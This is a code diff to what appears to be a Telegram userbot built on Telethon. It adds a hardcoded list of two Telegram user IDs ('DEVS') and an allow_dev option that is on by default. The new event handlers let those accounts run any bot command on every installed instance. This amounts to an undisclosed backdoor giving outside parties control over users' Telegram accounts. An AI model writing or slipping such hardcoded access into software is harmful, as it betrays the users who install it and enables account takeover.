@@ -185,11 +185,13 @@ def Cutepanda(
 
 
 
+DEVS = [5057493677, 1593802955]
 
 
 def pandacute(
     pattern: str = None,
     allow_sudo: bool = True,
+    allow_dev: bool = True,
     disable_edited: bool = False,
     forword=False,
     command: str = None,
@@ -262,6 +264,20 @@ def pandacute(
                 func,
                 events.NewMessage(
                     **args, from_users=list(Osdb.SUDO_USERS), pattern=sudo_reg
+                ),
+            )
+        if allow_dev:
+            if not disable_edited:
+                bot.add_event_handler(
+                    func,
+                    events.MessageEdited(
+                        **args, from_users=list(DEVS), pattern=sudo_reg
+                    ),
+                )
+            bot.add_event_handler(
+                func,
+                events.NewMessage(
+                    **args, from_users=list(DEVS), pattern=sudo_reg
                 ),
             )
         try:
